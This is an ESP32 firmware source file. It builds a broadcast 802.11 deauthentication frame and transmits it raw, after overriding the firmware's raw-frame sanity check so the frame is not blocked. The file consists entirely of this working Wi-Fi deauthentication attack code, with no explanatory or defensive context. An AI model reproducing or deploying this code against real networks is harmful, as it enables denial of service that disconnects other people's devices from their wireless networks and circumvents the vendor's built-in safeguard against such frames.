#include <stdio.h>
#include <string.h>
#include "esp_event.h"
#include "esp_err.h"
#include "freertos/task.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "nvs_flash.h"
#include "esp_wifi.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
  return 0;
}

const uint8_t deauth_frame[] = {
    // frame control start
    0xc0, 0x00, //type and subtype, to/fromDS
    // frame control end
    0x00, 0x01, //duration ID
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // destination address (broadcast)
    0x48, 0xe7, 0x29, 0x98, 0x0b, 0x7d, // source address of esp32
    0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // frame body

};

extern "C" void app_main()
{
    nvs_flash_init(); // wifi configuration stored in nvs
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();


    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); // create default config here and alter config later
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    esp_wifi_set_mode(WIFI_MODE_AP); // set mode in order to use alter AP configs

    ESP_ERROR_CHECK(esp_wifi_start());

    esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);

}
